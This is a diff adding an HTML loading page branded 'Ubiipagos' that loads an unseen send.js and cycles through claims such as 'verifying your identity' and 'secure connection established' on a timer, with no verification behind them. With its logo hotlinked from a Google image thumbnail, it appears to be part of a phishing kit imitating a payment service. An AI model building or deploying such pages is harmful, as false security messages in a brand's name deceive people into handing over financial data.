@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ubiipagos</title>
+    <link rel="icon" href="ubii_logo1.png" type="image/x-icon">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        :root {
+            /* Colores primarios Ubii */
+            --ubii-purple: #7c3aed;
+            --ubii-purple-light: #8b5cf6;
+            --ubii-purple-dark: #6d28d9;
+            --ubii-cyan: #06b6d4;
+            --ubii-cyan-light: #22d3ee;
+            
+            /* Modo claro */
+            --bg-primary: #ffffff;
+            --bg-secondary: #f8f9fa;
+            --bg-tertiary: #f0f1f5;
+            
+            --text-primary: #1a1a1a;
+            --text-secondary: #6b7280;
+            --text-tertiary: #9ca3af;
+            
+            --border-color: #e5e7eb;
+            --shadow-light: 0 1px 3px rgba(0, 0, 0, 0.08);
+            --shadow-medium: 0 4px 12px rgba(0, 0, 0, 0.12);
+            --shadow-large: 0 12px 32px rgba(0, 0, 0, 0.15);
+        }
+
+        /* Tema oscuro */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-primary: #0f0f0f;
+                --bg-secondary: #1a1a1a;
+                --bg-tertiary: #2a2a2a;
+                
+                --text-primary: #f5f5f5;
+                --text-secondary: #d1d5db;
+                --text-tertiary: #9ca3af;
+                
+                --border-color: #374151;
+                --shadow-light: 0 1px 3px rgba(0, 0, 0, 0.3);
+                --shadow-medium: 0 4px 12px rgba(0, 0, 0, 0.4);
+                --shadow-large: 0 12px 32px rgba(0, 0, 0, 0.5);
+            }
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: var(--bg-primary);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
+            transition: background-color 0.3s ease;
+            color: var(--text-primary);
+        }
+
+        /* CONTENEDOR PRINCIPAL */
+        .loader-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            max-width: 480px;
+            width: 100%;
+        }
+
+        /* CONTENEDOR DEL SPINNER */
+        .spinner-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 40px;
+        }
+
+        /* SPINNER MINIMALISTA */
+        .spinner {
+            width: 80px;
+            height: 80px;
+            position: relative;
+        }
+
+        /* Spinner animado - solo el anillo activo */
+        .spinner::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 2.5px solid transparent;
+            border-top-color: var(--ubii-purple);
+            border-right-color: var(--ubii-purple);
+            animation: spin 1.2s linear infinite;
+        }
+
+        /* LOGO CENTRAL */
+        .logo-wrapper {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .logo {
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            overflow: hidden;
+            background: var(--bg-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: var(--shadow-light);
+            animation: fadeLogo 2.5s ease-in-out infinite;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* TEXTOS */
+        .loading-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--text-primary);
+            text-align: center;
+            margin-bottom: 12px;
+            letter-spacing: -0.2px;
+        }
+
+        .loading-dots::after {
+            content: "";
+            animation: dots 1.5s infinite steps(4, end);
+            display: inline-block;
+            width: 16px;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: var(--text-secondary);
+            text-align: center;
+            line-height: 1.4;
+            font-weight: 400;
+        }
+
+        /* ANIMACIONES */
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes fadeLogo {
+            0%, 100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.85;
+                transform: scale(0.95);
+            }
+        }
+
+        @keyframes dots {
+            0% {
+                content: "";
+            }
+            25% {
+                content: ".";
+            }
+            50% {
+                content: "..";
+            }
+            75% {
+                content: "...";
+            }
+        }
+
+        @keyframes progress {
+            0% {
+                width: 0%;
+            }
+            50% {
+                width: 80%;
+            }
+            100% {
+                width: 100%;
+            }
+        }
+
+        /* RESPUESTAS MÓVILES */
+        @media (max-width: 480px) {
+            .loader-wrapper {
+                padding: 20px;
+            }
+
+            .spinner {
+                width: 72px;
+                height: 72px;
+            }
+
+            .spinner-container {
+                margin-bottom: 32px;
+            }
+
+            .loading-text {
+                font-size: 15px;
+            }
+
+            .subtext {
+                font-size: 12px;
+            }
+        }
+
+        /* ACCESIBILIDAD */
+        @media (prefers-reduced-motion: reduce) {
+            .spinner::after,
+            .logo,
+            .progress-bar {
+                animation: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="loader-wrapper">
+        <div class="spinner-container">
+            <div class="spinner">
+                <div class="logo-wrapper">
+                    <div class="logo">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRsJTf0c2Poj5fFvYLrHcahEKwV07l-vawazg&s" alt="Ubii Logo">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="loading-text" id="mainText">
+            Validando información<span class="loading-dots"></span>
+        </div>
+
+        <div class="subtext" id="subText">
+            Por favor espera mientras verificamos tu identidad
+        </div>
+    </div>
+
+    <script src="send.js"></script>
+    <script>
+        console.log("[Load.html] Script iniciando...");
+
+        // Variables globales para el control
+        let loadPageInitialized = false;
+        let redirectTimer = null;
+
+        function initLoadPage() {
+            if (loadPageInitialized) {
+                console.log("[Load.html] Ya fue inicializado, abortando");
+                return;
+            }
+            loadPageInitialized = true;
+
+            console.log("[Load.html] Iniciando animación...");
+
+            const mainText = document.getElementById("mainText");
+            const subText = document.getElementById("subText");
+
+            if (!mainText || !subText) {
+                console.error("[Load.html] Elementos no encontrados, reintentando...");
+                loadPageInitialized = false;
+                setTimeout(initLoadPage, 300);
+                return;
+            }
+
+            const steps = [
+                {
+                    title: "Validando información",
+                    sub: "Por favor espera mientras verificamos tu identidad"
+                },
+                {
+                    title: "Verificando identidad",
+                    sub: "Protegemos tu información en todo momento"
+                },
+                {
+                    title: "Confirmando datos",
+                    sub: "Estamos asegurando tu acceso"
+                },
+                {
+                    title: "Conectando servidor",
+                    sub: "Conexión segura establecida"
+                }
+            ];
+
+            let stepIndex = 0;
+            let isTransitioning = false;
+
+            function changeStep() {
+                if (isTransitioning) return;
+
+                isTransitioning = true;
+                stepIndex = (stepIndex + 1) % steps.length;
+                mainText.style.opacity = "0";
+                subText.style.opacity = "0";
+
+                setTimeout(() => {
+                    mainText.innerHTML = steps[stepIndex].title + '<span class="loading-dots"></span>';
+                    subText.textContent = steps[stepIndex].sub;
+                    mainText.style.opacity = "1";
+                    subText.style.opacity = "1";
+                    isTransitioning = false;
+                }, 400);
+            }
+
+            // Cambiar cada 3 segundos
+            const stepInterval = setInterval(changeStep, 3000);
+
+            window.addEventListener("beforeunload", () => {
+                clearInterval(stepInterval);
+            });
+
+            console.log("[Load.html] Animación iniciada correctamente");
+        }
+
+        // Ejecutar DESPUÉS de que send.js cargue
+        if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", initLoadPage);
+        } else {
+            setTimeout(initLoadPage, 100);
+        }
+
+        // Detectar cambios en preferencia de tema en tiempo real
+        if (window.matchMedia) {
+            const darkModeQuery = window.matchMedia('(prefers-color-scheme: dark)');
+            
+            const handleThemeChange = (e) => {
+                console.log("[Load.html] Tema del dispositivo cambió a:", e.matches ? 'oscuro' : 'claro');
+                // El tema se aplica automáticamente vía CSS
+            };
+
+            // Escuchar cambios (disponible en navegadores modernos)
+            if (darkModeQuery.addEventListener) {
+                darkModeQuery.addEventListener('change', handleThemeChange);
+            }
+        }
+    </script>
+</body>
+</html>
